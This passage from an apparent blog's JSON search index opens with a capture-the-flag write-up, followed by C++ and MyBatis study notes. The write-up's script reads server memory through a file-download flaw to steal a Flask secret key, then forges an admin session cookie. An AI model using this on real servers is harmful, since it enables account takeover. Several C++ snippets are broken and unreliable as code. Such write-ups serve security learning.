63 64 65 66 67 68 69 70 71 72 73 74 75 import requests import re def get_memory_regions(target): \u0026#34;\u0026#34;\u0026#34;获取可读写的匿名内存区域\u0026#34;\u0026#34;\u0026#34; try: response = requests.get(f\u0026#34;{target}/download?file=/proc/self/maps\u0026#34;, timeout=10) regions = [] for line in response.text.splitlines(): # 筛选包含Python字符串的内存区域特征 # 注意，由 rw-p 改为 rw,删去and if \u0026#39;rw\u0026#39; in line:# and (\u0026#39;anon_inode\u0026#39; in line or \u0026#39;[heap]\u0026#39; in line): addr_range = line.split()[0] start, end = addr_range.split(\u0026#39;-\u0026#39;) regions.append((int(start, 16), int(end, 16))) return regions except Exception as e: print(f\u0026#34;获取内存映射失败: {e}\u0026#34;) return [] def search_secret_key(target, regions): \u0026#34;\u0026#34;\u0026#34;在指定内存区域搜索secret_key\u0026#34;\u0026#34;\u0026#34; # 匹配模式：Yulin开头 + 16位字母数字 pattern = rb\u0026#39;Yulin[A-Za-z0-9]{16}\u0026#39; for start, end in regions: print(f\u0026#34;扫描内存区域: 0x{start:x} - 0x{end:x}\u0026#34;) # 分块读取（每次1MB，平衡速度和稳定性） chunk_size = 1 * 1024 * 1024 current = start while current \u0026lt; end: chunk_end = min(current + chunk_size, end) try: # 读取内存块 resp = requests.get( f\u0026#34;{target}/download?file=/proc/self/mem\u0026#34;, params={\u0026#39;start\u0026#39;: current, \u0026#39;end\u0026#39;: chunk_end}, timeout=15 ) # 搜索密钥 match = re.search(pattern, resp.content) if match: return match.group(0).decode() current = chunk_end print(f\u0026#34;已扫描: {int((current - start)/(end - start)*100)}%\u0026#34;, end=\u0026#39;\\r\u0026#39;) except Exception as e: print(f\u0026#34;\\n读取内存块失败(0x{current:x}): {e}\u0026#34;) current += chunk_size # 跳过错误块 return None def main(): target = \u0026#34;http://prob01-4a2b75818e1a60809324fca5d9adda1a.recruit.yulinsec.cn\u0026#34; print(f\u0026#34;目标地址: {target}\u0026#34;) # 获取内存区域 regions = get_memory_regions(target) if not regions: print(\u0026#34;未找到可扫描的内存区域\u0026#34;) return print(f\u0026#34;发现 {len(regions)} 个可扫描内存区域\u0026#34;) # 搜索secret_key secret_key = search_secret_key(target, regions) if secret_key: print(f\u0026#34;\\n找到secret_key: {secret_key}\u0026#34;) else: print(\u0026#34;\\n未找到secret_key，请尝试重新运行\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() 主要是 request 库还是不熟，还有 re 正则匹配、字符串处理。\n先这样吧。\n得到 secret_key：xxxx\n漏洞利用 得到了 key 以后，抓包发现文件头中并不包含 Cookie！\n考虑自己构造，发送 于是使用 flask-session-cookie-manager 来构造\n还顺便配置了 py2、py3\n1 2 3 D:\\software\\tools\\flask-session-cookie-manager-1.2.2\u0026gt;python .\\flask_session_cookie_manager2.py encode -s \u0026#34;Yulin9IlwFlKE3K6ubjNn\u0026#34; -t \u0026#34;{\u0026#39;is_admin\u0026#39;:\u0026#39;true\u0026#39;}\u0026#34; eyJpc19hZG1pbiI6eyIgYiI6ImRISjFaUT09In19.aO5EQg.kmSLHAE42MX1z895x02HEdD8zqg 这里要注意的是 true 也要用分号包围……\n放到 bp，完成！\n","date":"2025-10-14T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E5%BE%A1%E5%9B%BE%E7%BD%91/","title":"御林招新题：御图网"},{"content":"内存分区模型 程序运行前 编译后生成 exe 可执行程序，分为两个区域\n代码区：\n存放CPU执行的机器指令 代码区是共享的，共享的目的是对于频繁被执行的程序，只需要在内存中有一份代码即可 代码区是只读的，使其只读的原因是防止程序意外地修改了它的指令 全局区：\n全局变量和静态变量存放在此 局部变量（即使用 const 修饰）不在全局区中 全局区还包含了常量区，字符串常量和其他常量也存放在此 const 修饰的全局常量、字符串常量 该区域的数据在程序结束后由操作系统释放 程序运行后 栈区：\n由编译器自动分配释放，存放函数的参数值，局部变量等 注意事项：不要返回局部变量的地址，栈区开辟的数据由编译器自动释放（如函数的形参、局部变量） 堆区：\n由程序员分配释放，若程序员不释放，程序结束时由操作系统回收 在 C++ 中主要利用 new 在堆区开辟内存 1 2 3 4 5 6 7 int * func () { //利用new关键字可以将数据开辟到堆区 //指针本质也是局部变量，放在栈上，指针保存的数据是放在堆区 int * p=newint(10) ; return p; } new 操作符 C++中利用new操作符在堆区开辟数据\n堆区开辟的数据，由程序员手动开辟，手动释放，释放利用操作符delete\ndelete 对应指针 利用new创建的数据，会返回该数据对应的类型的指针\n1 2 3 4 // 创建数组 int* a = new int(length); //释放数组的时候要加[]才可以,指明一段内存空间 delete[] arr; 引用 给变量起别名\n变量的含义：用于指代，操作某块内存 1 2 // 语法：数据类型\u0026amp;别名=原名 int \u0026amp;b = a; 注意事项 引用必须初始化 初始化后不可再改变 引用做函数参数 作用：函数传参时，可以利用引用的技术让形参修饰实参\n优点：可以简化指针修改实参\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 //1.值传递 void mySwap01（int a,int b）{ int temp=a; a = b b = temp; } //2.地址传递 void mySwapθ2（int *a,int *b）{ int temp*a; *b; *b=temp; } //3.引用传递,别名和本名可以相同 void mySwap03（int \u0026amp;a，int \u0026amp;b）{ int temp =a; a = b b = temp; } 引用做返回值 注意：不要返回局部变量引用\n用法：函数调用作为左值\n1 2 3 4 5 6 7 //2、函数的调用可以作为左值 int\u0026amp; test02( { staticinta=10;//静态变量，存放在全局区，全局区上的数据在程序结束后系统释放 return a; } test02() = 1000 // 支持 引用的本质 本质是指针常量，由编译器转换为指针\n1 2 3 //自动转换为 int*constref=\u0026amp;a；指针常量是指针指向不可改，也说明为什么引用不可更改 int\u0026amp; ref=a; ref = 20；//内部发现 ref 是引用，自动帮我们转换为：*ref=20； 常量引用 1 2 3 4 5 //常量引用 //使用场景：用来修饰形参，防止误操作 //int\u0026amp; a = 10; 这行错误，非法空间 //加上const之后编译器将代码修改int temp = 10;const int \u0026amp;rettemp; const int\u0026amp; ref=10；//引用必须引一块合法的内存空间 函数 默认参数 C++中，函数的形参列表中的形参是可以有默认值的\n1 2 3 int func(int a,int b = 20 ， int c = 30){ return a + b + c; } 如果某个位置已经有了默认参数，那么从这个位置往后，从左到右都必须有默认值 如果函数声明有默认参数，函数实现就不能有默认参数 占位参数 1 2 3 4 //函数占位参数，占位参数也可以有默认参数 void func（int a，int）{ cout\u0026lt;\u0026lt;“thisisfunc\u0026#34;\u0026lt;\u0026lt;endl; } 重载 作用：函数名可以相同，提高复用性\n函数重载满足条件：\n同一个作用域下 函数名称相同 函数参数类型不同或者个数不同或者顺序不同 返回值不同不可以作为条件 注意 引用作为重载条件\n以 const 为标志的区分，是否可写 数重载碰到函数默认参数\n出现二义性，报错 类和对象 封装 意义：\n属性和行为作为一个整体，表现生活中的事物 属性和行为加以权限控制 语法：class 类名 { 访问权限：属性/行为 }；\n1 2 3 4 5 6 7 8 9 10 class circle { public: int r; double calculateC(){ return 2 * PI * r; } } Circle c1; // 实例化 c1.r = 10; // 给属性赋值 类中的属性和行为统一称为成员\n成员属性 \u0026ndash;\u0026gt; 成员变量 成员函数 \u0026ndash;\u0026gt; 成员方法 访问权限 public：类内可以访问，类外可以访问\nprotected：类内可以访问，类外不可以访问，继承类可访问\nprivate：类内可以访问，类外不可以访问。\nStruct 和 Class 唯一的区别就在于默认的访问权限不同\nstruct 默认权限为公共 class 默认权限为私有 成员属性私有化 优点：\n所有成员属性设置为私有，可以自己控制读写权限 对于写权限，我们可以检测数据的有效性 用 set 、get 方法控制权限、操作\n对象的初始化和清理 构造函数和析构函数 构造函数：主要作用在于创建对象时为对象的成员属性赋值，构造函数由编译器自动调用，无须手动调用。\n没有返回值也不写void 函数名称与类名相同 类名(){} 构造函数可以有参数，因此可以发生重载 程序在调用对象时候会自动调用构造，无须手动调用，而且只会调用一次 析构函数：主要作用在于对象销毁前系统自动调用，执行一些清理工作。\n没有返回值也不写void 函数名称与类名相同，在名称前加上符号 ~ 析构函数不可以有参数，因此不可以发生重载 程序在对象销毁前会自动调用析构，无须手动调用，而且只会调用一次 构造函数分类与调用 分类：\n按参数分为：有参构造和无参构造 使用默认无参构造时，不要加括号，否则会认为是函数声明 按类型分为：普通构造和拷贝构造 不要用拷贝构造函数初始化匿名对象，编译器会认为 Person(p3) === Person p3 1 2 3 4 //拷贝构造函数 Person(const Person\u0026amp; p）{ age =p.age; } 调用方式：括号法，显式法，隐式转换法\n1 2 3 4 //1、括号法 Person p1；//默认构造函数调用 Person p2(10)；//有参构造函数 Person p(p2)；//拷贝构造函数 1 2 3 4 5 //2、显示法 Person p1; //不能加括号 Person p2=Person(10)；//有参构造 Person p3=Person（p2）；//拷贝构造 Person(10)；//匿名对象特点：当前行执行结束后，系统会立即回收掉匿名对象 1 2 3 //3、隐式转换法 Person p4 = 10;//相当于写了Person p4 =Person(10);有参构造 Person p5 = p4;// 拷贝构造 拷贝构造函数的调用时机 使用一个已经创建完毕的对象来初始化一个新对象 传递的方式给函数参数传值 值方式返回局部对象 在函数内部创建的对象被返回时，会创建一个新的对象返回 拷贝构造函数的调用规则 默认情况下，C++编译器至少给一个类添加3个函数：\n默认构造函数（无参，函数体为空） 默认析构函数(无参，函数体为空) 认拷贝构造函数，对属性进行值拷贝 定义有参构造函数，C++ 不再提供默认无参构造，但是会提供默认拷贝构造\n定义拷贝构造函数，C++ 不会再提供其他构造函数\n深浅拷贝 浅：简单的赋值拷贝\n默认提供的是浅拷贝 深：在堆内存重新创建一块内存，进行拷贝\n涉及到申请堆区时，需要深拷贝 初始化列表 1 2 3 4 5 //初始化列表初始化属性 Person(int a, int b,int c) :m_A(a),m_B(b), m_C(c) { ... } 类作为类成员 当类有嵌套时，会先构造内部对象，析构顺序与构造相反\n静态成员 静态成员变量：\n所有对象共享同一份数据 在编译阶段分配内存 类内声明，类外初始化 静态成员函数：\n所有对象共享同一个函数 只能访问静态成员变量 因为调用函数时，无法定位非静态成员变量（属于特定对象） 可以通过对象，也可以直接通过类名访问，有访问权限\n内存模型和 this 指针 内存：\n类内的成员变量和成员函数分开存储\n只有非静态成员变量才属于类的对象上\nthis 指针：\n指向被调用的成员函数所属的对象，隐含在每一个非静态成员函数内 当形参和成员变量同名时，可用this指针来区分 this -\u0026gt; name 在类的非静态成员函数中返回对象本身，可使用 return *this 实现链式编程 1 2 3 4 5 6 Person\u0026amp; PersonAddAge(Person \u0026amp;p) { this-\u0026gt;age += p.age; //this指向p2的指针，而*this指向的就是p2这个对象本体 return *this; } 注意返回 Person**\u0026amp;**，值返回会调用拷贝函数创建一个新的对象\n空指针访问成员函数 1 2 3 Person * p = NULL; p-\u0026gt;showClassName (); // 只要所调用的函数中没有使用到 this 即可(包含隐含的 this，用于访问属性) const 修饰成员函数 常函数：\n成员函数后加const后我们称为这个函数为常函数\n常函数内不可以修改成员属性\n成员属性声明时加关键字mutable后，则在常函数中也可以修改\n1 2 3 4 5 6 //this指针的本质是指针常量指针的指向是不可以修改的 const Person * const this; // 设置指针指向的值也无法修改 void showPersonO() const{ this-\u0026gt;m_A = 100; } //this=NULL； //this指针不可以修改指针的指向 常对象：\n声明对象前加const称该对象为常对象 对象只能调用常函数 友元 使一个函数或者类访问另一个类中私有成员，关键字friend\n三种实现：\n局函数做友元 类做友元 成员函数做友元 friend void clazz::method(); 在类中声明 friend，被声明的可以访问本类的私有属性\n运算符重载 定义自定义类型的运算方式\n成员函数重载：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //1、成员函数重载+号，本质调用：Person p3 =pl.operator+(p2); Person operator+(Person \u0026amp;p) { Person temp; temp.m_A=this-\u0026gt;m_A +p.m_A； temp.m_B =Ithis-\u0026gt;m_B +p.m_B; return temp; } //2、全局函数重载+号,本质调用：Person p3 = operator+(pl,p2); Person operator+(Person \u0026amp;pl,Person \u0026amp;p2) { Person temp; temp.m_A =pl.m_A +p2.m_A; temp.m_B=pl.m_B+p2.m_B; return temp; } 左移 只能通过全局函数重载\n1 2 3 4 5 6 //只能利用全局函数重载左移运算符 void operator\u0026lt;\u0026lt;(ostream \u0026amp;cout,Person \u0026amp;p)//本质: operate\u0026lt;\u0026lt; (cout,p) { cout \u0026lt;\u0026lt; p.name; return cout; } 递增 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 //重载前置++运算符返回引用为了一直对一个数据进行递增操作 MyInteger\u0026amp; operator++() { //先进行++运算 m_Num++; //再将自身做返回 return *this; } //重载后置++运算符 //void operator++(int) int代表占位参数，可以用于区分前置和后置递增 MyInteger operator++(int) { //先记录当时结果 MyInteger temp = *this; //后递增 m_Num++; 7/最后将记录结果做返回 return temp; } 赋值 默认实现为浅拷贝，p1 = p2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // 重载赋值运算符 Person\u0026amp; operator=(Person \u0026amp;p) { if (m_Age != NULL) { delete m_Age; m_Age = NULL; } // 编译器提供的代码是浅拷贝 // m_Age = p.m_Age; // 提供深拷贝 解决浅拷贝的问题 m_Age = new int(*p.m_Age); // 返回自身 return *this; } 注意：返回引用，可以操作自身；返回值，会拷贝出一个对象。目的是为了实现连等\n关系 1 2 3 4 5 6 7 8 9 10 11 bool operator==(Person \u0026amp;p) { if (this-\u0026gt;m_Name == p.m_Name \u0026amp;\u0026amp; this-\u0026gt;m_Age == p.m_Age) { return true; } else { return false; } } 函数调用 （） 仿函数\n非常灵活 1 2 3 4 5 //重载函数调用运算符 void operator() (string test) { cout\u0026lt;\u0026lt; test \u0026lt;\u0026lt; endl; } 继承 下级别的成员除了拥有上一级的共性，还有自己的特性，抽取出父、子\n用于减少重复代码 1 2 3 4 class son : public father { ... } 继承方式 向下压级，私有被隐藏，但还是会继承\n继承的对象模型 父类中所有非静态成员属性都会被子类继承下去\n构造、析构顺序 子类继承父类后，当创建子类对象，也会调用父类的构造函数\n先有父，后有子；析构相反 同名成员处理 父类加作用域 s.base::func(); 只要子类有同名，父类函数全都被隐藏（重载也不行） 子类直接访问 同名静态成员 静态成员和非静态成员出现同名，处理方式一致\n多继承 class son: type fa1,type fa2\n不建议，父类命名可能重复\n菱形继承 一出二，二合一\n孙类继承了两份父类的相同数据，产生冗余\n利用虚继承解决菱形继承\n1 2 3 4 5 6 7 8 9 //利用虚继承解决菱形继承的问题 //继承之前加上关键字virtual变为虚继承 //Anima1类称为虚基类 [//羊类 class Sheep0:virtual public Animal{}： //驼类 class Tuo :virtual public Animal{}; //羊驼类 class SheepTuo :public ISheep, public Tuo{}; 多态 基本概念 多态分为两类\n静态多态：函数重载和运算符重载属于静态多态，复用函数名 动态多态：派生类和虚函数实现运行时多态 有派生类时，动态绑定子类重写的虚函数（父类指针指向子类对象） 静态多态和动态多态区别：\n静态多态的函数地址早绑定－编译阶段确定函数地址 动态多态的函数地址晚绑定－运行阶段确定函数地址 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Animal { public: //Speak函数就是虚函数 //函数前面加上virtual关键字，变成虚函数，那么编译器在编译的时候就不能确定函数调用了。 virtual void speak() { cout \u0026lt;\u0026lt; \u0026#34;动物在说话\u0026#34; \u0026lt;\u0026lt; endl; } }; class Cat :public Animal { public: void speak() { cout \u0026lt;\u0026lt; \u0026#34;小猫在说话\u0026#34; \u0026lt;\u0026lt; endl; } }; 原理：\n子类重写父类虚函数时：子类中的虚函数表内部会替换成子类的虚函数地址 优点：\n满足“开闭原则” 扩展对外开放，修改对外关闭\n组织结构清晰，可读性强 可维护性强 纯虚函数和抽象类 virtual 返回值类型 函数名（参数列表）= θ；\n当类中有了纯虚函数，这个类也称为抽象类\n抽象类无法实例化 子类必须重写父类的纯虚函数，否则子类也是抽象类 虚析构与纯虚析构 共性：\n解决父类指针释放子类对象 原因：父类指针指向子类对象，delete 的时候只调用父类的析构函数 都需要有具体的函数实现 差异：\n如果是纯虚析构，该类属于抽象类，无法实例化对象 虚析构函数需要被实现 若堆中没有数据，可以不写\n文件操作 文本文件 文件以 ASCII 码存储\n操作文件的三大类：\nofstream：写操作 ifstream：读操作 fstream：读写操作 写文件 步骤：\n包含头文件 #include \u0026lt;fstream\u0026gt; 创建流对象 ofstream ofs; 打开文件 ofs.open(\u0026quot;文件路径\u0026quot;,打开方式); 写数据 ofs\u0026lt;\u0026lt;\u0026quot;写入的数据\u0026quot;; 关闭文件ofs.close() 二进制 ios::binary\n","date":"2025-10-13T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251013082109789.png","permalink":"https://calendar0917.github.io/posts/c++%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/","title":"C++ 核心编程"},{"content":"Mybatis 介绍 轻量级，性能出色 封装 JDBC SQL 和 Java 编码分开，功能边界清晰。Java 代码专注业务、SQL 语句专注数据 官网：https://mybatis.org/mybatis-3/zh/# 使用 创建SpringBoot工程、引入Mybatis相关依赖\n准备数据库表即对应实体类\n配置 Mybatis（在application.properties中数据库连接信息）\n编写 Mybatis 程序：编写 Mybatis 的持久层接口，定义 SQL（注解/XML）\n@Mapper：应用程序在运行时，会自动的为该接口创建一个实现类对象（代理对象），并且会自动将该实现类对象存入I0C容器 辅助配置 定义注解的语句为 MySQL 语法\nIDEA 连接数据库\n日志\n1 2 #配置mybatis的日志输出 mybatis.configuration.logimpl=org.apache.ibatis.logging.stdout.StdoutImpl 数据库连接池 数据库连接池是个容器，负责分配、管理数据库连接（Connection） 资源重用 允许应用程序重复使用一个现有的数据库连接，而不是再重新建立一个 提升系统响应速度 释放空闲时间超过最大空闲时间的连接，来避免因为没有释放连接而引起的数据库连接遗漏 避免数据库连接遗漏 1 2 3 4 5 6 // 引入德鲁伊连接池 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;druid-spring-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.19\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; spring.datasource.type=com.alibaba.druid.pool.DruidDataSource\n底层实现 DataSource 接口\n操作 新增 1 2 @Insert(\u0026#34;insert insert(username,password,name,age) values (#{username},#{password},#{name},#{age})\u0026#34;) // 写的是对象属性名 public void insert(User user2); 删除 1 2 3 @Delete(\u0026#34;delete from user where id = #{id}\u0026#34;) public Integer deleteById(Integer id); // 可以返回影响的行数 修改 1 2 @Update(\u0026#34;update user set username=#{username}, password=#{password}, name=#{name}, age=#{age} where id=#{id}\u0026#34;) public void update(User user); 查询 1 2 @Select(\u0026#34;select * from user where username=#{username} and password=#{password}\u0026#34;) public User findByUsernameAndPassword(@Param(\u0026#34;username\u0026#34;) String username, @Param(\u0026#34;password\u0026#34;) String password); 有多个参数时，需要 @param 注解 XML 映射配置 默认规则：\nXML 映射文件的名称与 Mapper 接口名称一致，并且将 XML 映射文件和 Mapper 接口放置在相同包下（ resource 中同包同名）。\nXML 映射文件的 namespace 属性为 Mapper 接口全限定名一致。\n1 2 3 4 5 \u0026lt;mapper namespace=\u0026#34;com.itheima.mapper.UserMapper\u0026#34;\u0026gt; \u0026lt;select id=\u0026#34;findAll\u0026#34; resultType=\u0026#34;com.itheima.pojo.User\u0026#34;\u0026gt; select id，username，password，name，age from user \u0026lt;/select\u0026gt; \u0026lt;/mapper\u0026gt; XML 映射文件中 sql 语句的 id 与 Mapper 接口中的方法名一致，并保持返回类型一致。 动态 SQL IF 1 2 3 4 5 6 7 8 9 \u0026lt;select id=\u0026#34;selectAllWebsite\u0026#34; resultMap=\u0026#34;myResult\u0026#34;\u0026gt; select id,name,url from website where 1=1 \u0026lt;if test=\u0026#34;name != null\u0026#34;\u0026gt; AND name like #{name} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;url!= null\u0026#34;\u0026gt; AND url like #{url} \u0026lt;/if\u0026gt; \u0026lt;/select\u0026gt; choose-when-otherwise 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;mapper namespace=\u0026#34;net.biancheng.mapper.WebsiteMapper\u0026#34;\u0026gt; \u0026lt;select id=\u0026#34;selectWebsite\u0026#34; parameterType=\u0026#34;net.biancheng.po.Website\u0026#34; resultType=\u0026#34;net.biancheng.po.Website\u0026#34;\u0026gt; SELECT id,name,url,age,country FROM website WHERE 1=1 \u0026lt;choose\u0026gt; \u0026lt;when test=\u0026#34;name != null and name !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; AND name LIKE CONCAT(\u0026#39;%\u0026#39;,#{name},\u0026#39;%\u0026#39;) \u0026lt;/when\u0026gt; \u0026lt;when test=\u0026#34;url != null and url !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; AND url LIKE CONCAT(\u0026#39;%\u0026#39;,#{url},\u0026#39;%\u0026#39;) \u0026lt;/when\u0026gt; \u0026lt;otherwise\u0026gt; AND age is not null \u0026lt;/otherwise\u0026gt; \u0026lt;/choose\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;/mapper\u0026gt; 注意：AND 不能省！\nWHERE where 会检索语句，它会将 where 后的第一个 SQL 条件语句的 AND 或者 OR 关键词去掉。\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;select id=\u0026#34;selectWebsite\u0026#34; resultType=\u0026#34;net.biancheng.po.Website\u0026#34;\u0026gt; select id,name,url from website \u0026lt;where\u0026gt; \u0026lt;if test=\u0026#34;name != null\u0026#34;\u0026gt; AND name like #{name} \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;url!= null\u0026#34;\u0026gt; AND url like #{url} \u0026lt;/if\u0026gt; \u0026lt;/where\u0026gt; \u0026lt;/select\u0026gt; SET set 标签可以为 SQL 语句动态的添加 set 关键字，剔除追加到条件末尾多余的逗号\n1 2 3 4 5 6 7 8 9 \u0026lt;update id=\u0026#34;updateWebsite\u0026#34; parameterType=\u0026#34;net.biancheng.po.Website\u0026#34;\u0026gt; UPDATE website \u0026lt;set\u0026gt; \u0026lt;if test=\u0026#34;name!=null\u0026#34;\u0026gt;name=#{name}\u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;url!=null\u0026#34;\u0026gt;url=#{url}\u0026lt;/if\u0026gt; \u0026lt;/set\u0026gt; WHERE id=#{id} \u0026lt;/update\u0026gt; foreach foreach 标签用于循环语句，它很好的支持了数据和 List、set 接口的集合，并对此提供遍历的功能\n1 2 3 \u0026lt;foreach item=\u0026#34;item\u0026#34; index=\u0026#34;index\u0026#34; collection=\u0026#34;list|array|map key\u0026#34; open=\u0026#34;(\u0026#34; separator=\u0026#34;,\u0026#34; close=\u0026#34;)\u0026#34;\u0026gt; 参数值 \u0026lt;/foreach\u0026gt; foreach 标签主要有以下属性，说明如下。\nitem：表示集合中每一个元素进行迭代时的别名。 index：指定一个名字，表示在迭代过程中每次迭代到的位置。 open：表示该语句以什么开始（既然是 in 条件语句，所以必然以(开始）。 separator：表示在每次进行迭代之间以什么符号作为分隔符（既然是 in 条件语句，所以必然以,作为分隔符）。 close：表示该语句以什么结束（既然是 in 条件语句，所以必然以)开始）。 使用 foreach 标签时，最关键、最容易出错的是 collection 属性，该属性是必选的，但在不同情况下该属性的值是不一样的，主要有以下 3 种情况：\n如果传入的是单参数且参数类型是一个 List，collection 属性值为 list。 如果传入的是单参数且参数类型是一个 array 数组，collection 的属性值为 array。 如果传入的参数是多个，需要把它们封装成一个 Map，当然单参数也可以封装成 Map。Map 的 key 是参数名，collection 属性值是传入的 List 或 array 对象在自己封装的 Map 中的 key。 trim trim 一般用于去除 SQL 语句中多余的 AND 关键字、逗号，或者给 SQL 语句前拼接 where、set 等后缀，可用于选择性插入、更新、删除或者条件查询等操作\n1 2 3 \u0026lt;trim prefix=\u0026#34;前缀\u0026#34; suffix=\u0026#34;后缀\u0026#34; prefixOverrides=\u0026#34;忽略前缀字符\u0026#34; suffixOverrides=\u0026#34;忽略后缀字符\u0026#34;\u0026gt; SQL语句 \u0026lt;/trim\u0026gt; bind bind 标签可以通过 OGNL 表达式自定义一个上下文变量\n1 2 3 4 5 6 \u0026lt;select id=\u0026#34;selectWebsite\u0026#34; resultType=\u0026#34;net.biancheng.po.Website\u0026#34;\u0026gt; \u0026lt;bind name=\u0026#34;pattern\u0026#34; value=\u0026#34;\u0026#39;%\u0026#39;+_parameter+\u0026#39;%\u0026#39;\u0026#34; /\u0026gt; SELECT id,name,url,age,country FROM website WHERE name like #{pattern} \u0026lt;/select\u0026gt; 实现分页 使用 limit：\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;select id=\u0026#34;selectWebsite\u0026#34; resultType=\u0026#34;net.biancheng.po.Website\u0026#34;\u0026gt; SELECT id,name,url,age,country FROM website \u0026lt;trim prefix=\u0026#34;where\u0026#34; prefixOverrides=\u0026#34;and\u0026#34;\u0026gt; \u0026lt;if test=\u0026#34;site.name != null and site.name !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; AND name LIKE CONCAT (\u0026#39;%\u0026#39;,#{site.name},\u0026#39;%\u0026#39;) \u0026lt;/if\u0026gt; \u0026lt;if test=\u0026#34;site.url!= null and site.url !=\u0026#39;\u0026#39;\u0026#34;\u0026gt; AND url LIKE CONCAT (\u0026#39;%\u0026#39;,#{site.url},\u0026#39;%\u0026#39;) \u0026lt;/if\u0026gt; ORDER BY id limit #{from},#{pageSize} \u0026lt;/trim\u0026gt; \u0026lt;/select\u0026gt; 逆向工程 导入依赖： 1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis.generator\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-generator-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; config 文件夹下创建 genertorConfig.xml 文件，用于配置及指定数据库及表等 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE generatorConfiguration PUBLIC \u0026#34;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd\u0026#34;\u0026gt; \u0026lt;generatorConfiguration\u0026gt; \u0026lt;context id=\u0026#34;DB2Tables\u0026#34; targetRuntime=\u0026#34;MyBatis3\u0026#34;\u0026gt; \u0026lt;commentGenerator\u0026gt; \u0026lt;!-- 是否去除自动生成的注释 --\u0026gt; \u0026lt;property name=\u0026#34;suppressAllComments\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/commentGenerator\u0026gt; \u0026lt;!-- Mysql数据库连接的信息：驱动类、连接地址、用户名、密码 --\u0026gt; \u0026lt;jdbcConnection driverClass=\u0026#34;com.mysql.jdbc.Driver\u0026#34; connectionURL=\u0026#34;jdbc:mysql://localhost:3306/test\u0026#34; userId=\u0026#34;root\u0026#34; password=\u0026#34;root\u0026#34; /\u0026gt; \u0026lt;!-- 默认为false，把JDBC DECIMAL 和NUMERIC类型解析为Integer，为true时 把JDBC DECIMAL 和NUMERIC类型解析为java.math.BigDecimal --\u0026gt; \u0026lt;javaTypeResolver\u0026gt; \u0026lt;property name=\u0026#34;forceBigDecimals\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;/javaTypeResolver\u0026gt; \u0026lt;!-- targetProject：生成POJO类的位置 --\u0026gt; \u0026lt;javaModelGenerator targetPackage=\u0026#34;net.biancheng.pojo\u0026#34; targetProject=\u0026#34;.\\src\u0026#34;\u0026gt; \u0026lt;!-- enableSubPackages:是否让schema作为包的后缀 --\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;!-- 从数据库返回的值被清理前后的空格 --\u0026gt; \u0026lt;property name=\u0026#34;trimStrings\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/javaModelGenerator\u0026gt; \u0026lt;!-- targetProject：mapper映射文件生成的位置 --\u0026gt; \u0026lt;sqlMapGenerator targetPackage=\u0026#34;net.biancheng.mapper\u0026#34; targetProject=\u0026#34;.\\src\u0026#34;\u0026gt; \u0026lt;!-- enableSubPackages:是否让schema作为包的后缀 --\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;/sqlMapGenerator\u0026gt; \u0026lt;!-- targetProject：mapper接口生成的的位置 --\u0026gt; \u0026lt;javaClientGenerator type=\u0026#34;XMLMAPPER\u0026#34; targetPackage=\u0026#34;net.biancheng.mapper\u0026#34; targetProject=\u0026#34;.\\src\u0026#34;\u0026gt; \u0026lt;!-- enableSubPackages:是否让schema作为包的后缀 --\u0026gt; \u0026lt;property name=\u0026#34;enableSubPackages\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;/javaClientGenerator\u0026gt; \u0026lt;!-- 指定数据表 --\u0026gt; \u0026lt;table tableName=\u0026#34;website\u0026#34;\u0026gt;\u0026lt;/table\u0026gt; \u0026lt;table tableName=\u0026#34;student\u0026#34;\u0026gt;\u0026lt;/table\u0026gt; \u0026lt;table tableName=\u0026#34;studentcard\u0026#34;\u0026gt;\u0026lt;/table\u0026gt; \u0026lt;table tableName=\u0026#34;user\u0026#34;\u0026gt;\u0026lt;/table\u0026gt; \u0026lt;/context\u0026gt; \u0026lt;/generatorConfiguration\u0026gt; 创建 GeneratorSqlmap 类执行生成代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 